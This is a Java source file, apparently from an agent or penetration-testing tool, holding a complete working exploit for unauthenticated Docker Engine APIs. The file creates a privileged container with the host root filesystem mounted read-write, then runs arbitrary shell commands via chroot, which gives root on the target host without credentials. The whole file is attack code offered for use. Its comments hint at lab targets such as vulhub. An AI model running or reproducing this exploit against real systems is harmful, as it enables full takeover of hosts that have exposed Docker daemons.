package com.spulido.agent.remote;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.spulido.agent.domain.task.TaskResult;

/**
 * Minimal Docker Engine API client used to exploit an unauthenticated Docker daemon:
 * a privileged container with the host root filesystem bind-mounted gives root on the
 * host with no credentials, matching the "unauthorized Docker API" technique
 * (create -> start -> exec via chroot). Uses {@link HttpURLConnection} only — no extra
 * HTTP client dependency, GraalVM-native safe.
 */
class DockerApiClient {

    private static final Logger log = LoggerFactory.getLogger(DockerApiClient.class);
    private static final String EXPLOIT_IMAGE = "alpine";

    private final ObjectMapper objectMapper = new ObjectMapper();

    void ensureExploitContainer(String host, int port, String containerName, int timeoutSeconds) throws IOException {
        HttpResult inspect = request(host, port, "GET", "/containers/" + containerName + "/json", null, timeoutSeconds);
        if (inspect.statusCode() == 200) {
            JsonNode json = objectMapper.readTree(inspect.body());
            boolean running = json.path("State").path("Running").asBoolean(false);
            if (running) {
                return;
            }
            HttpResult restart = request(host, port, "POST", "/containers/" + containerName + "/start", null, timeoutSeconds);
            if (restart.statusCode() == 204 || restart.statusCode() == 304) {
                return;
            }
            throw new IOException("Failed to (re)start existing exploit container: HTTP "
                    + restart.statusCode() + " " + restart.body());
        }

        try {
            request(host, port, "POST", "/images/create?fromImage=" + EXPLOIT_IMAGE + "&tag=latest", null,
                    Math.max(timeoutSeconds, 30));
        } catch (IOException e) {
            log.debug("Best-effort image pull failed (image may already be cached): {}", e.getMessage());
        }

        ObjectNode body = objectMapper.createObjectNode();
        body.put("Image", EXPLOIT_IMAGE);
        ArrayNode cmd = body.putArray("Cmd");
        cmd.add("tail");
        cmd.add("-f");
        cmd.add("/dev/null");
        // Bind mounts are recursive by default in the Docker Engine API; the legacy "Binds"
        // shorthand only accepts ro/rw/propagation-mode suffixes, not "rbind" (that is a mount
        // *type* flag from the newer HostConfig.Mounts array, not a valid Binds mode string —
        // older/vulhub daemons reject it with "invalid mode: rbind").
        ArrayNode binds = body.putArray("Binds");
        binds.add("/:/mnt:rw");
        body.put("Privileged", true);

        HttpResult create = request(host, port, "POST", "/containers/create?name=" + containerName,
                objectMapper.writeValueAsString(body), timeoutSeconds);
        if (create.statusCode() != 201 && create.statusCode() != 409) {
            throw new IOException("Docker container create failed: HTTP " + create.statusCode() + " " + create.body());
        }

        HttpResult start = request(host, port, "POST", "/containers/" + containerName + "/start", null, timeoutSeconds);
        if (start.statusCode() != 204 && start.statusCode() != 304) {
            throw new IOException("Docker container start failed: HTTP " + start.statusCode() + " " + start.body());
        }
    }

    TaskResult execInContainer(String host, int port, String containerName, String shellCommand, int timeoutSeconds) {
        String taskId = "docker-exec-" + System.currentTimeMillis();
        try {
            ObjectNode execBody = objectMapper.createObjectNode();
            execBody.put("AttachStdout", true);
            execBody.put("AttachStderr", true);
            execBody.put("Tty", true);
            ArrayNode cmd = execBody.putArray("Cmd");
            cmd.add("chroot");
            cmd.add("/mnt");
            cmd.add("sh");
            cmd.add("-c");
            cmd.add(shellCommand);

            HttpResult created = request(host, port, "POST", "/containers/" + containerName + "/exec",
                    objectMapper.writeValueAsString(execBody), timeoutSeconds);
            if (created.statusCode() != 201) {
                return TaskResult.failure(taskId, "Failed to create Docker exec instance",
                        "HTTP " + created.statusCode() + " " + created.body());
            }
            String execId = objectMapper.readTree(created.body()).path("Id").asText(null);
            if (execId == null || execId.isBlank()) {
                return TaskResult.failure(taskId, "Docker exec instance missing Id", created.body());
            }

            ObjectNode startBody = objectMapper.createObjectNode();
            startBody.put("Detach", false);
            startBody.put("Tty", true);
            HttpResult started = request(host, port, "POST", "/exec/" + execId + "/start",
                    objectMapper.writeValueAsString(startBody), timeoutSeconds);
            String output = started.body() != null ? started.body() : "";

            HttpResult inspect = request(host, port, "GET", "/exec/" + execId + "/json", null, timeoutSeconds);
            int exitCode = -1;
            if (inspect.statusCode() == 200) {
                exitCode = objectMapper.readTree(inspect.body()).path("ExitCode").asInt(-1);
            }

            if (exitCode == 0) {
                return TaskResult.success(taskId, output.trim());
            }
            return TaskResult.failure(taskId,
                    "Remote command failed via Docker API exec (exit " + exitCode + ")", output);

        } catch (IOException e) {
            return TaskResult.failure(taskId, "Docker API exec error",
                    e.getMessage() != null ? e.getMessage() : "Unknown error");
        }
    }

    private HttpResult request(String host, int port, String method, String path, String jsonBody,
                                int timeoutSeconds) throws IOException {
        URL url = new URL("http://" + host + ":" + port + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        try {
            conn.setRequestMethod(method);
            conn.setConnectTimeout((int) Math.min(Math.max(timeoutSeconds, 5), 15) * 1000);
            conn.setReadTimeout((int) Math.max(timeoutSeconds, 5) * 1000);
            if (jsonBody != null) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                }
            }
            int status = conn.getResponseCode();
            InputStream is = (status >= 200 && status < 300) ? conn.getInputStream() : conn.getErrorStream();
            String body = is != null ? new String(is.readAllBytes(), StandardCharsets.UTF_8) : "";
            return new HttpResult(status, body);
        } finally {
            conn.disconnect();
        }
    }

    private record HttpResult(int statusCode, String body) {
    }
}
